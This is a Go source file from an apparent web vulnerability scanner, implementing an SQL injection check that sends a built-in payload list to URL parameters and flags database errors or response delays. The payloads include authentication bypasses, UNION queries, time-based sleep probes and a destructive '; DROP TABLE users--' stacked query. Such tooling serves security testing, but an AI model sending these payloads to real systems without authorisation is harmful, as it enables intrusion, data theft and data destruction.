package hacker

import (
	"context"
	"fmt"
	"strings"
	"time"

	"github.com/NICE-DEV226/nice-Scan/internal/transport"
	"github.com/NICE-DEV226/nice-Scan/internal/types"
)

type SQLiAction struct{}

func (a *SQLiAction) Metadata() ActionMetadata {
	return ActionMetadata{
		Name:        "SQL Injection",
		Description: "Error-based + time-based SQL injection detection",
		Priority:    50,
		Requires:    []string{"has_sqli"},
		Provides:    []string{"has_sqli_exploit"},
	}
}

var sqliPayloads = []struct {
	name    string
	payload string
}{
	{"Single quote", "'"},
	{"Double quote", "\""},
	{"SQL comment", "'--"},
	{"SQL comment #", "'#"},
	{"OR true", "' OR '1'='1"},
	{"OR true 2", "' OR 1=1--"},
	{"OR true 3", "OR 1=1"},
	{"OR true 4", "1' OR '1'='1"},
	{"AND true", "' AND '1'='1"},
	{"UNION select", "' UNION SELECT NULL--"},
	{"UNION select 2", "' UNION SELECT 1,2,3--"},
	{"UNION all", "' UNION ALL SELECT NULL--"},
	{"Admin bypass 1", "' OR '1'='1' --"},
	{"Admin bypass 2", "admin' --"},
	{"Admin bypass 3", "admin' #"},
	{"Time sleep 5", "' OR SLEEP(5)--"},
	{"Time sleep 5 pg", "' OR pg_sleep(5)--"},
	{"Time waitfor", "'; WAITFOR DELAY '0:0:5'--"},
	{"Stacked query", "'; DROP TABLE users--"},
	{"Order by", "' ORDER BY 1--"},
	{"Group by", "' GROUP BY 1--"},
	{"Having", "' HAVING 1=1--"},
}

var sqliErrors = []string{
	"SQL syntax", "mysql_fetch", "ORA-", "Oracle", "SQLite",
	"PostgreSQL", "unclosed quotation mark", "Incorrect syntax",
	"Warning: mysql", "Division by zero", "Syntax error",
	"Microsoft OLE DB", "Invalid query", "mysql_result",
	"pg_query", "SQLITE_ERROR", "sqlite3", "ODBC",
	"SQL command not properly", "DB2", "Firebird",
}

func (a *SQLiAction) Execute(ctx context.Context, target string, kb *Knowledge, client *transport.Client) ActionResult {
	var findings []Finding
	var spawned []Action

	endpoints := kb.GetEndpoints()
	if len(endpoints) == 0 {
		pages := kb.GetPages()
		for _, p := range pages {
			if strings.Contains(p.URL, "?") {
				for _, param := range extractURLParams(p.URL) {
					result := testParam(ctx, client, p.URL, param)
					if result != nil {
						findings = append(findings, *result)
					}
				}
			}
		}
	}

	for _, ep := range endpoints {
		for _, param := range commonSQLiParams {
			testURL := ep.Path
			if strings.Contains(testURL, "?") {
				testURL += "&" + param + "=1"
			} else {
				testURL += "?" + param + "=1"
			}

			for _, p := range sqliPayloads {
				select {
				case <-ctx.Done():
					return ActionResult{Findings: findings, Actions: spawned}
				default:
				}

				payloadURL := strings.Replace(testURL, "=1", "="+p.payload, 1)
				resp, err := client.Do(ctx, &types.Request{
					Method: "GET",
					URL:    payloadURL,
				})
				if err != nil {
					continue
				}

				body := string(resp.Body)
				if hasSQLError(body) {
					findings = append(findings, Finding{
						Type:        "sqli_error",
						Name:        fmt.Sprintf("SQLi: %s via param %s", p.name, param),
						Severity:    SevHigh,
						Description: fmt.Sprintf("Database error detected with payload: %s", p.payload),
						Evidence:    fmt.Sprintf("URL: %s", payloadURL),
					})

				spawned = append(spawned, &SQLiDataExtractAction{
					vulnURL: payloadURL,
					param:   param,
					payload: p.payload,
				})
				break
			}

			if strings.Contains(p.name, "Time sleep") {
				start := time.Now()
				client.Do(ctx, &types.Request{Method: "GET", URL: payloadURL})
				if time.Since(start) >= 4*time.Second {
					findings = append(findings, Finding{
						Type:        "sqli_time",
						Name:        fmt.Sprintf("SQLi Time-Based: %s via %s", p.name, param),
						Severity:    SevCritical,
						Description: fmt.Sprintf("Response delayed by %v", time.Since(start)),
						Evidence:    payloadURL,
					})

					spawned = append(spawned, &SQLiDataExtractAction{
						vulnURL: payloadURL,
						param:   param,
						payload: p.payload,
					})
					break
				}
			}
		}
	}
	}

	return ActionResult{Findings: findings, Actions: spawned}
}

var commonSQLiParams = []string{
	"id", "user_id", "userId", "user", "uid", "username",
	"page", "p", "cat", "category", "product", "prod",
	"order", "sort", "search", "q", "s", "query",
	"file", "path", "dir", "action", "cmd",
	"email", "pass", "url", "redirect",
}

func hasSQLError(body string) bool {
	lowBody := strings.ToLower(body)
	for _, err := range sqliErrors {
		if strings.Contains(lowBody, strings.ToLower(err)) {
			return true
		}
	}
	return false
}

func extractURLParams(urlStr string) []string {
	var params []string
	if strings.Contains(urlStr, "?") {
		parts := strings.SplitN(urlStr, "?", 2)
		for _, pair := range strings.Split(parts[1], "&") {
			kv := strings.SplitN(pair, "=", 2)
			if len(kv) == 2 && len(kv[0]) > 0 {
				params = append(params, kv[0])
			}
		}
	}
	return params
}

func testParam(ctx context.Context, client *transport.Client, url, param string) *Finding {
	testPayload := "' OR '1'='1"
	base := strings.SplitN(url, "?", 2)
	testURL := base[0] + "?" + param + "=" + testPayload

	resp, err := client.Do(ctx, &types.Request{Method: "GET", URL: testURL})
	if err != nil {
		return nil
	}

	if hasSQLError(string(resp.Body)) {
		return &Finding{
			Type:        "sqli_error",
			Name:        fmt.Sprintf("SQLi in param: %s", param),
			Severity:    SevHigh,
			Description: fmt.Sprintf("SQL error detected with: %s", testPayload),
			Evidence:    testURL,
		}
	}
	return nil
}
